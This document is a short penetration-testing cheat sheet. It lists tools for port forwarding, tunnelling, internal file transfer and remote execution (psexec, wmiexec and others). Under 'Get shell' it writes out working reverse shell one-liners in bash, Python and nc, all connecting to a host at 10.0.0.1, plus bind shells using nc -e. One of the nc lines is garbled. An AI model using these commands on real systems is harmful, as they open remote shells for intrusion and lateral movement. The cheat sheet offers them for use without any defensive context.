Comprehensive skills
========================================

Port Forwarding
----------------------------------------
- windows
- LCX
- Netsh
- linux
- portmap
- iptables
- socket proxy
- Win: xsocks
- Linux: proxychains
- http-based forwarding and socket proxy (penetration under low privileges)
- Port Forwarding: tunna
- socks proxy: reGeorg
- ssh channel
- Port Forwarding
- socks

Get shell
----------------------------------------
- Regular shell rebound

::

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

- Imcp_shell rebound that breaks through the firewall
- Forward shell

::

nc -e /bin/n-pn-pn-pp 1234
nc.exe -e cmd.exe -lp 1234

Intranet file transfer
----------------------------------------
- File transfer under windows
- powershell
- vbs script file
- bitsadmin
- File Sharing
- Receive data using telnet
- hta
- File transfer under linux
- Python
- wget
- Tar + SSH
- Transfer data using dns
- File Compilation
- powershell converts exe to txt, and then converts txt to exe

Remote connection && Execute the program
----------------------------------------
- at&schtasks
- psexec
- wmic
- wmiexec.vbs
- smbexec
- powershell remoting
- SC Creation Service Execution
- schtasks
- SMB+MOF || DLL Hijacks
- PTH + compmgmt.msc
